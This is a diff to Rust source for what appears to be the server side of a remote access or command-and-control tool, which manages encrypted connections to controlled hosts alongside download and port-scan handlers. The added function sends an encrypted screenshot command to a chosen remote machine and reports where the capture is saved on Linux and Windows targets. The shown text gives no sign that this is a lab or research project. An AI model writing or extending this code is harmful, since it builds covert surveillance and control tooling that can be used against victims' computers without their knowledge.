@@ -338,6 +338,34 @@ pub async fn handle_download(active_connections: &Arc<Mutex<HashMap<String, Conn
         Err(err) => Err(format!("Error writing to file: {}", err)),
     }
 }
+
+pub async fn handle_screenshot(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
+    if raw_connection {
+        return Err("Screenshot command not supported for raw connections".to_string());
+    }
+    let parts: Vec<&str> = command.split(" ").collect();
+    if parts.len() < 2 {
+        return Err("Invalid command, expected 'screenshot ID'".to_string());
+    }
+    let id: usize = match parts[1].trim().parse() {
+        Ok(num) => num,
+        Err(_) => return Err("Invalid ID".to_string()),
+    };
+    let active_connections = active_connections.lock().await;
+    if !active_connections.values().any(|value| value.id == id) {
+        return Err("Invalid ID".to_string());
+    }
+    let screenshot_cmd = "||SCREENSHOT|| ".to_owned();
+    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let stream = connection_info.stream.clone();
+    let shared_secret = connection_info.shared_secret;
+    let screenshot_cmd = encrypt(screenshot_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
+    
+    stream.lock().await.write(&screenshot_cmd).await.expect("Error writing to stream");
+    
+    Ok(format!("Screenshot command sent to {}.\nCheck in /tmp for linux or C:\\Windows\\Temp for windows", id))
+}
+
 pub async fn handle_port_scan(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
     if raw_connection {
         return Err("Port scan command not supported for raw connections".to_string());
